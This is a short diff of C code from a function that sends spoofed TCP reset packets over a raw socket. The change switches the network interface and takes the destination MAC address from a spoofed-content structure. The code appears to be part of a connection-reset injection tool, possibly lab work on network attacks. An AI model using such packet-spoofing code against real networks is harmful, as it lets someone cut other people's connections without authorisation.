@@ -117,8 +117,7 @@ void sendResetPacket(spoofedcontent &spoofedContent)
     struct tcpheader *tcpHeader = (struct tcpheader *) (packet + sizeof (struct ipheader) + sizeof (struct ethernetheader));
     struct pseudoheader pseudoHeader;
 
-    char interface[] = "ens33";
-    unsigned char destinationMAC[ETH_ALEN] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+    char interface[] = "eth0";
     
     int rawSocket = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
     
@@ -207,7 +206,7 @@ void sendResetPacket(spoofedcontent &spoofedContent)
     destinationInterface.sll_family = AF_PACKET;   
     destinationInterface.sll_ifindex = interfaceIndex;
     destinationInterface.sll_halen = ETH_ALEN;
-    memcpy((void*)(destinationInterface.sll_addr), (void*)destinationMAC, ETH_ALEN);
+    memcpy((void*)(destinationInterface.sll_addr), (void*)spoofedContent.destinationInterface, ETH_ALEN);
 
     if(sendto(rawSocket, packet, packetSize, 0, (struct sockaddr *) &destinationInterface, sizeof (destinationInterface)) < 0)
     {
